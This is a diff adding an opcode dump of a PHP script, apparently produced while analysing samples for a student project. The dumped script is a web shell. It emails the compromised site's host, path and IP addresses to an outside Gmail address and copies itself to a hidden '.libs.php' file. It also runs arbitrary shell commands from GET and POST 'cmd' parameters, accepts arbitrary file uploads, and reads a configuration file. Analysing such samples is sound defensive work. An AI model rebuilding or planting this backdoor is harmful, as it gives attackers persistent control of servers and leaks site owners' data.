@@ -1,0 +1,216 @@
+function name: (null)
+L1-88 {main}() /Users/jiwon/Library/Mobile Documents/com~apple~CloudDocs/졸업과제/backend/outputs/00bb03b98a47e43882a8efc661e293ef.php - 0x1052a7000 + 213 ops
+ L3    #0     FETCH_IS<2>             "_SESSION"                                ~0                  
+ L3    #1     ISSET_ISEMPTY_DIM_OBJ   ~0                   "bajak"              ~1                  
+ L3    #2     BOOL_NOT                ~1                                        ~2                  
+ L3    #3     JMPZ                    ~2                   J72                                      
+ L4    #4     ASSIGN                  $visitcount          0                                        
+ L5    #5     FETCH_R<2>              "_SERVER"                                 ~4                  
+ L5    #6     FETCH_DIM_R             ~4                   "HTTP_HOST"          ~5                  
+ L5    #7     ASSIGN                  $web                 ~5                                       
+ L6    #8     FETCH_R<2>              "_SERVER"                                 ~7                  
+ L6    #9     FETCH_DIM_R             ~7                   "REQUEST_URI"        ~8                  
+ L6    #10    ASSIGN                  $inj                 ~8                                       
+ L7    #11    ROPE_INIT<3>                                 "Target ditemukan "+ ~11                 
+ L7    #12    ROPE_ADD<1>             ~11                  $web                 ~11                 
+ L7    #13    ROPE_END<2>             ~11                  $inj                 ~10                 
+ L7    #14    ASSIGN                  $body                ~10                                      
+ L8    #15    BEGIN_SILENCE                                                     ~14                 
+ L8    #16    INIT_FCALL<1>           96                   "ini_get"                                
+ L8    #17    SEND_VAL                "safe_mode"          1                                        
+ L8    #18    DO_ICALL                                                          @15                 
+ L8    #19    END_SILENCE             ~14                                                           
+ L8    #20    ASSIGN                  $safem0de            @15                                      
+ L9    #21    BOOL_NOT                $safem0de                                 ~17                 
+ L9    #22    JMPZ                    ~17                  J25                                      
+ L10   #23    ASSIGN                  $security            "SAFE_MODE = OFF"                        
+ L10   #24    JMP                     J26                                                           
+ L12   #25    ASSIGN                  $security            "SAFE_MODE = ON"                         
+ L14   #26    INIT_FCALL<1>           96                   "gethostbyname"                          
+ L14   #27    FETCH_R<2>              "_SERVER"                                 ~20                 
+ L14   #28    FETCH_DIM_R             ~20                  "SERVER_ADDR"        ~21                 
+ L14   #29    SEND_VAL                ~21                  1                                        
+ L14   #30    DO_ICALL                                                          @22                 
+ L14   #31    ASSIGN                  $serper              @22                                      
+ L15   #32    INIT_FCALL<1>           96                   "gethostbyname"                          
+ L15   #33    FETCH_R<2>              "_SERVER"                                 ~24                 
+ L15   #34    FETCH_DIM_R             ~24                  "REMOTE_ADDR"        ~25                 
+ L15   #35    SEND_VAL                ~25                  1                                        
+ L15   #36    DO_ICALL                                                          @26                 
+ L15   #37    ASSIGN                  $injektor            @26                                      
+ L16   #38    INIT_FCALL<3>           128                  "mail"                                   
+ L16   #39    SEND_VAL                "jalangsaya@gmail."+ 1                                        
+ L16   #40    CAST<6>                 $body                                     ~28                 
+ L16   #41    SEND_VAL                ~28                  2                                        
+ L16   #42    ROPE_INIT<9>                                 "Hasil Bajakan htt"+ ~30                 
+ L16   #43    ROPE_ADD<1>             ~30                  $web                 ~30                 
+ L16   #44    ROPE_ADD<2>             ~30                  $inj                 ~30                 
+ L16   #45    ROPE_ADD<3>             ~30                  "\n"                 ~30                 
+ L16   #46    ROPE_ADD<4>             ~30                  $security            ~30                 
+ L16   #47    ROPE_ADD<5>             ~30                  "\nIP Server = "     ~30                 
+ L16   #48    ROPE_ADD<6>             ~30                  $serper              ~30                 
+ L16   #49    ROPE_ADD<7>             ~30                  "\n IP Injector= "   ~30                 
+ L16   #50    ROPE_END<8>             ~30                  $injektor            ~29                 
+ L16   #51    SEND_VAL                ~29                  3                                        
+ L16   #52    DO_ICALL                                                                              
+ L17   #53    INIT_FCALL<3>           128                  "mail"                                   
+ L17   #54    SEND_VAL                "jalangsaya@gmail."+ 1                                        
+ L17   #55    CAST<6>                 $body                                     ~36                 
+ L17   #56    SEND_VAL                ~36                  2                                        
+ L17   #57    ROPE_INIT<9>                                 "Hasil Bajakan htt"+ ~38                 
+ L17   #58    ROPE_ADD<1>             ~38                  $web                 ~38                 
+ L17   #59    ROPE_ADD<2>             ~38                  $inj                 ~38                 
+ L17   #60    ROPE_ADD<3>             ~38                  "\n"                 ~38                 
+ L17   #61    ROPE_ADD<4>             ~38                  $security            ~38                 
+ L17   #62    ROPE_ADD<5>             ~38                  "\nIP Server = "     ~38                 
+ L17   #63    ROPE_ADD<6>             ~38                  $serper              ~38                 
+ L17   #64    ROPE_ADD<7>             ~38                  "\n IP Injector= "   ~38                 
+ L17   #65    ROPE_END<8>             ~38                  $injektor            ~37                 
+ L17   #66    SEND_VAL                ~37                  3                                        
+ L17   #67    DO_ICALL                                                                              
+ L18   #68    FETCH_W<2>              "_SESSION"                                @44                 
+ L18   #69    ASSIGN_DIM              @44                  "bajak"                                  
+ L18   #70    OP_DATA                 1                                                             
+ L18   #71    JMP                     J76                                                           
+ L20   #72    FETCH_RW<2>             "_SESSION"                                @46                 
+ L20   #73    FETCH_DIM_RW            @46                  "bajak"              @47                 
+ L20   #74    POST_INC                @47                                       ~48                 
+ L20   #75    FREE                    ~48                                                           
+ L22   #76    FETCH_IS<2>             "_GET"                                    ~49                 
+ L22   #77    ISSET_ISEMPTY_DIM_OBJ   ~49                  "clone"              ~50                 
+ L22   #78    JMPZ                    ~50                  J90                                      
+ L23   #79    FETCH_R<2>              "_SERVER"                                 ~51                 
+ L23   #80    FETCH_DIM_R             ~51                  "SCRIPT_FILENAME"    ~52                 
+ L23   #81    ASSIGN                  $source              ~52                                      
+ L24   #82    FETCH_R<2>              "_SERVER"                                 ~54                 
+ L24   #83    FETCH_DIM_R             ~54                  "DOCUMENT_ROOT"      ~55                 
+ L24   #84    CONCAT                  ~55                  "/.libs.php"         ~56                 
+ L24   #85    ASSIGN                  $desti               ~56                                      
+ L25   #86    INIT_FCALL<2>           112                  "rename"                                 
+ L25   #87    SEND_VAR                $source              1                                        
+ L25   #88    SEND_VAR                $desti               2                                        
+ L25   #89    DO_ICALL                                                                              
+ L27   #90    BEGIN_SILENCE                                                     ~59                 
+ L27   #91    INIT_FCALL<1>           96                   "ini_get"                                
+ L27   #92    SEND_VAL                "safe_mode"          1                                        
+ L27   #93    DO_ICALL                                                          @60                 
+ L27   #94    END_SILENCE             ~59                                                           
+ L27   #95    ASSIGN                  $safem0de            @60                                      
+ L28   #96    BOOL_NOT                $safem0de                                 ~62                 
+ L28   #97    JMPZ                    ~62                  J100                                     
+ L29   #98    ASSIGN                  $security            "SAFE_MODE : OFF j"+                     
+ L29   #99    JMP                     J101                                                          
+ L31   #100   ASSIGN                  $security            "SAFE_MODE : ON ja"+                     
+ L33   #101   ECHO                    "<title>jalanG</ti"+                                          
+ L34   #102   ASSIGN                  $dataku              "POWERED BY jalanG"                      
+ L35   #103   ASSIGN                  $dataku2             "ready fresh tools"+                     
+ L36   #104   ASSIGN                  $dataku3             "Contact Admin YM "+                     
+ L37   #105   ECHO                    "<font size=2 colo"+                                          
+ L38   #106   ECHO                    "<font size=2 colo"+                                          
+ L39   #107   ECHO                    "<font size=2 colo"+                                          
+ L40   #108   CONCAT                  "<font size=2 colo"+ $security            ~68                 
+ L40   #109   CONCAT                  ~68                  "</b><br>"           ~69                 
+ L40   #110   ECHO                    ~69                                                           
+ L41   #111   INIT_FCALL              80                   "get_current_user"                       
+ L41   #112   DO_ICALL                                                          @70                 
+ L41   #113   CONCAT                  "("                  @70                  ~71                 
+ L41   #114   CONCAT                  ~71                  ")"                  ~72                 
+ L41   #115   ASSIGN                  $cur_user            ~72                                      
+ L42   #116   INIT_FCALL              80                   "getmyuid"                               
+ L42   #117   DO_ICALL                                                          @74                 
+ L42   #118   CONCAT                  "<font size=2 colo"+ @74                  ~75                 
+ L42   #119   CONCAT                  ~75                  $cur_user            ~76                 
+ L42   #120   CONCAT                  ~76                  " gid="              ~77                 
+ L42   #121   INIT_FCALL              80                   "getmygid"                               
+ L42   #122   DO_ICALL                                                          @78                 
+ L42   #123   CONCAT                  ~77                  @78                  ~79                 
+ L42   #124   CONCAT                  ~79                  $cur_user            ~80                 
+ L42   #125   CONCAT                  ~80                  "</b><br>"           ~81                 
+ L42   #126   ECHO                    ~81                                                           
+ L43   #127   INIT_FCALL              80                   "php_uname"                              
+ L43   #128   DO_ICALL                                                          @82                 
+ L43   #129   CONCAT                  "<font size=2 colo"+ @82                  ~83                 
+ L43   #130   CONCAT                  ~83                  "</b><br>"           ~84                 
+ L43   #131   ECHO                    ~84                                                           
+ L61   #132   ECHO                    "<form method=\"PO"+                                          
+ L62   #133   ECHO                    "<form enctype=\"m"+                                          
+ L63   #134   FETCH_IS<2>             "_POST"                                   ~85                 
+ L63   #135   ISSET_ISEMPTY_DIM_OBJ   ~85                  "submit"             ~86                 
+ L63   #136   JMPZ                    ~86                  J172                                     
+ L64   #137   INIT_FCALL              336                  "pwd"                                    
+ L64   #138   DO_FCALL                                                          @87                 
+ L64   #139   ASSIGN                  $uploaddir           @87                                      
+ L65   #140   FETCH_R<2>              "_POST"                                   ~89                 
+ L65   #141   FETCH_DIM_R             ~89                  "newname"            ~90                 
+ L65   #142   ASSIGN                  $name                ~90                  @91                 
+ L65   #143   BOOL_NOT                @91                                       ~92                 
+ L65   #144   JMPZ                    ~92                  J149                                     
+ L66   #145   FETCH_R<2>              "_FILES"                                  ~93                 
+ L66   #146   FETCH_DIM_R             ~93                  "userfile"           ~94                 
+ L66   #147   FETCH_DIM_R             ~94                  "name"               ~95                 
+ L66   #148   ASSIGN                  $name                ~95                                      
+ L68   #149   INIT_FCALL<2>           112                  "move_uploaded_file"                     
+ L68   #150   FETCH_R<2>              "_FILES"                                  ~97                 
+ L68   #151   FETCH_DIM_R             ~97                  "userfile"           ~98                 
+ L68   #152   FETCH_DIM_R             ~98                  "tmp_name"           ~99                 
+ L68   #153   SEND_VAL                ~99                  1                                        
+ L68   #154   CONCAT                  $uploaddir           $name                ~100                
+ L68   #155   SEND_VAL                ~100                 2                                        
+ L68   #156   DO_ICALL                                                                              
+ L69   #157   INIT_FCALL<2>           112                  "move_uploaded_file"                     
+ L69   #158   FETCH_R<2>              "_FILES"                                  ~102                
+ L69   #159   FETCH_DIM_R             ~102                 "userfile"           ~103                
+ L69   #160   FETCH_DIM_R             ~103                 "tmp_name"           ~104                
+ L69   #161   SEND_VAL                ~104                 1                                        
+ L69   #162   CONCAT                  $uploaddir           $name                ~105                
+ L69   #163   SEND_VAL                ~105                 2                                        
+ L69   #164   DO_ICALL                                                          @106                
+ L69   #165   JMPZ                    @106                 J168                                     
+ L70   #166   ECHO                    "Upload Failed"                                               
+ L70   #167   JMP                     J172                                                          
+ L72   #168   CONCAT                  "Upload Success to " $uploaddir           ~107                
+ L72   #169   CONCAT                  ~107                 $name                ~108                
+ L72   #170   CONCAT                  ~108                 " Succes! "          ~109                
+ L72   #171   ECHO                    ~109                                                          
+ L75   #172   FETCH_IS<2>             "_POST"                                   ~110                
+ L75   #173   ISSET_ISEMPTY_DIM_OBJ   ~110                 "command"            ~111                
+ L75   #174   JMPZ                    ~111                 J185                                     
+ L76   #175   FETCH_R<2>              "_POST"                                   ~112                
+ L76   #176   FETCH_DIM_R             ~112                 "cmd"                ~113                
+ L76   #177   ASSIGN                  $cmd                 ~113                                     
+ L77   #178   INIT_FCALL<1>           96                   "shell_exec"                             
+ L77   #179   SEND_VAR                $cmd                 1                                        
+ L77   #180   DO_ICALL                                                          @115                
+ L77   #181   CONCAT                  "<pre><font size=3"+ @115                 ~116                
+ L77   #182   CONCAT                  ~116                 "</font></pre>"      ~117                
+ L77   #183   ECHO                    ~117                                                          
+ L77   #184   JMP                     J204                                                          
+ L78   #185   FETCH_IS<2>             "_GET"                                    ~118                
+ L78   #186   ISSET_ISEMPTY_DIM_OBJ   ~118                 "cmd"                ~119                
+ L78   #187   JMPZ                    ~119                 J198                                     
+ L79   #188   FETCH_R<2>              "_GET"                                    ~120                
+ L79   #189   FETCH_DIM_R             ~120                 "cmd"                ~121                
+ L79   #190   ASSIGN                  $comd                ~121                                     
+ L80   #191   INIT_FCALL<1>           96                   "shell_exec"                             
+ L80   #192   SEND_VAR                $comd                1                                        
+ L80   #193   DO_ICALL                                                          @123                
+ L80   #194   CONCAT                  "<pre><font size=3"+ @123                 ~124                
+ L80   #195   CONCAT                  ~124                 "</font></pre>"      ~125                
+ L80   #196   ECHO                    ~125                                                          
+ L80   #197   JMP                     J204                                                          
+ L82   #198   INIT_FCALL<1>           96                   "shell_exec"                             
+ L82   #199   SEND_VAL                "ls -la"             1                                        
+ L82   #200   DO_ICALL                                                          @126                
+ L82   #201   CONCAT                  "<pre><font size=3"+ @126                 ~127                
+ L82   #202   CONCAT                  ~127                 "</font></pre>"      ~128                
+ L82   #203   ECHO                    ~128                                                          
+ L84   #204   FETCH_IS<2>             "_GET"                                    ~129                
+ L84   #205   ISSET_ISEMPTY_DIM_OBJ   ~129                 "baca"               ~130                
+ L84   #206   JMPZ                    ~130                 J212                                     
+ L85   #207   INIT_FCALL<1>           96                   "file_get_contents"                      
+ L85   #208   SEND_VAL                "../../configurati"+ 1                                        
+ L85   #209   DO_ICALL                                                          @131                
+ L85   #210   ASSIGN                  $conf                @131                                     
+ L86   #211   ECHO                    $conf                                                         
+ L88   #212   RETURN<-1>              1                                                             
+[0;32m[Script ended normally][0m
